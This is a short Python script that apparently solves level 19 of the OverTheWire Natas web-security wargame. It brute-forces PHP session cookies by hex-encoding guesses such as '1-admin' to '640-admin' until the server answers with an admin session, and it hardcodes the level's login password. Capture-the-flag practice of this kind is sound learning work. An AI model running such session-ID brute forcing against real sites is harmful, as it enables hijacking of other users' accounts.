import requests

url = "http://natas19.natas.labs.overthewire.org/index.php"
auth = ("natas19" , "8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s")

def asciihexnatas(s):
    ret = ""
    for mot in s:
        coded = hex(ord(mot))
        ret += coded[2:]
    return ret


for i in range(1,641):

    phpsessid = asciihexnatas(f"{i}-admin")
    print (f"I try {i}-admin --> {phpsessid}")
    cookies = {"PHPSESSID" : phpsessid }
    resp = requests.get(url , auth=auth , cookies=cookies)

    if "regular user" not in resp.text:
        print("i found it")
        print (resp.text)
        break

